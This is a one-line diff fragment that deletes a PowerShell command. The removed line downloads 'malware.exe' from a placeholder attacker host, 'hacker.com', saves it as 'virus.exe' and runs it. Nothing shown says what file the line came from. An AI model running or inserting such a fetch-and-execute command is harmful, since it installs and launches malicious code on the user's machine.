@@ -1,1 +1,0 @@
-Invoke-WebRequest -Uri 'http://hacker.com/malware.exe' -OutFile 'virus.exe'; .\virus.exe
